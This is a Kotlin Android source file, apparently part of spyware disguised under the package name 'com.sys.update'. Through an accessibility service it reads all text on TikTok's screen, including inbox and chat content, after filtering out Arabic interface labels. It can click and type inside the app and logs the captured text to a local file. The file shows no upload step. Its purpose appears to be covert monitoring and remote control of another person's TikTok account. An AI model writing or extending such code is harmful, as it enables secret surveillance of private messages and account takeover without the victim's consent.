package com.sys.update

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object TikTokController {

    private val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.US)

    private const val TIKTOK_PKG = "com.zhiliaoapp.musically"
    private const val TIKTOK_PKG_ALT = "com.ss.android.ugc.trill"

    private val IGNORE_KEYWORDS = listOf(
        "الرموز التعبيرية",
        "الملصقات",
        "الصور المتحركة",
        "إرفاق وسائط",
        "تسجيل رسالة صوتية",
        "العودة للخلف",
        "مزيد من الخيارات",
        "صفحات ويب",
        "الرسالة",
        "صورة الملف الشخصي",
        "إرسال",
        "رجوع",
        "إغلاق",
        "خيارات",
        "متابعة",
        "مشاركة",
        "إعجاب",
        "تعليق",
        "حفظ",
        "حذف",
        "تعديل",
        "إلغاء",
        "حسابي",
        "الرئيسية",
        "الأصدقاء",
        "استكشاف",
        "صندوق الوارد",
        "الملف الشخصي",
        "الإعدادات والخصوصية",
        "الأمان",
        "المحتوى",
        "الحساب",
        "عام"
    )

    private fun isTikTokInstalled(ctx: Context): String? {
        val pkgs = listOf(TIKTOK_PKG, TIKTOK_PKG_ALT)
        for (p in pkgs) {
            try {
                ctx.packageManager.getPackageInfo(p, 0)
                return p
            } catch (_: Exception) {}
        }
        return null
    }

    fun openTikTok(ctx: Context): Boolean {
        try {
            val pkg = isTikTokInstalled(ctx) ?: return false
            val intent = ctx.packageManager.getLaunchIntentForPackage(pkg) ?: return false
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            ctx.startActivity(intent)
            return true
        } catch (e: Exception) {
            Log.e("TikTokController", "openTikTok err: ${e.message}")
            return false
        }
    }

    /**
     * ⭐ يتحقق أن التطبيق الأمامي هو تيك توك
     */
    fun isTikTokForeground(service: AccessibilityService?): Boolean {
        try {
            val root = service?.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: ""
            root.recycle()
            return pkg == TIKTOK_PKG || pkg == TIKTOK_PKG_ALT
        } catch (_: Exception) { return false }
    }

    /**
     * الحزمة الحالية في المقدمة
     */
    fun getForegroundPackage(service: AccessibilityService?): String {
        try {
            val root = service?.rootInActiveWindow ?: return "unknown"
            val pkg = root.packageName?.toString() ?: "unknown"
            root.recycle()
            return pkg
        } catch (_: Exception) { return "unknown" }
    }

    /**
     * قراءة نصوص تيك توك فقط
     * ترجع null إذا التطبيق الأمامي ليس تيك توك
     */
    fun readTikTokTexts(service: AccessibilityService?): List<String>? {
        // ⭐ فحص الحزمة
        if (!isTikTokForeground(service)) return null

        val raw = mutableListOf<String>()
        try {
            val root = service?.rootInActiveWindow ?: return emptyList()
            collectTexts(root, raw, 0)
            root.recycle()
        } catch (e: Exception) {
            Log.e("TikTokController", "readTikTok err: ${e.message}")
        }

        return raw
            .map { it.trim() }
            .filter { text ->
                if (text.isBlank()) return@filter false
                if (text.length < 3) return@filter false
                if (text.contains("desc", ignoreCase = true)) return@filter false
                val low = text.lowercase()
                if (IGNORE_KEYWORDS.any { kw -> low == kw.lowercase() }) return@filter false
                true
            }
            .distinct()
    }

    private fun collectTexts(node: AccessibilityNodeInfo?, out: MutableList<String>, depth: Int) {
        if (node == null || depth > 15) return
        try {
            val text = node.text?.toString()?.trim()
            if (!text.isNullOrBlank() && text.length > 1) out.add(text)
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                collectTexts(child, out, depth + 1)
                child.recycle()
            }
        } catch (_: Exception) {}
    }

    fun clickByText(service: AccessibilityService?, text: String): Boolean {
        try {
            val root = service?.rootInActiveWindow ?: return false
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes.isNullOrEmpty()) { root.recycle(); return false }
            val clickable = nodes.firstOrNull { it.isClickable } ?: nodes.firstOrNull()
            val ok = clickable?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: false
            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
            root.recycle()
            return ok
        } catch (_: Exception) { return false }
    }

    fun typeText(service: AccessibilityService?, text: String): Boolean {
        try {
            val root = service?.rootInActiveWindow ?: return false
            val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (focused == null) { root.recycle(); return false }
            val args = Bundle()
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            val ok = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            focused.recycle()
            root.recycle()
            return ok
        } catch (_: Exception) { return false }
    }

    fun saveToFile(ctx: Context, label: String, lines: List<String>) {
        try {
            val f = File(ctx.filesDir, "tiktok_capture.jsonl")
            val entry = org.json.JSONObject().apply {
                put("type", "tiktok")
                put("label", label)
                put("time", timeFmt.format(Date()))
                put("content", lines.joinToString(" | "))
            }
            java.io.FileOutputStream(f, true).use { fos ->
                fos.write((entry.toString() + "\n").toByteArray())
            }
        } catch (_: Exception) {}
    }
}
